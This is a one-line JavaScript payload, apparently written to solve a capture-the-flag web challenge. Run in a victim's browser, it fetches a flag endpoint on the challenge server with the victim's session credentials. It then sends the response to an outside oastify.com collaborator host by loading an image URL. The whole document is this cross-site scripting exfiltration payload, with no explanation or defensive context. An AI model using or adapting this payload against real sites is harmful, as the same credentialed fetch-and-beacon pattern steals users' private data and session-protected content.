fetch('http://chals.swampctf.com:41673/api/getFlag',{credentials:'include'}).then(r=>r.text()).then(f=>new Image().src='https://ds9pqk6xrifvybv7ae0vj7ew1n7ev5ju.oastify.com/?'+encodeURIComponent(f));
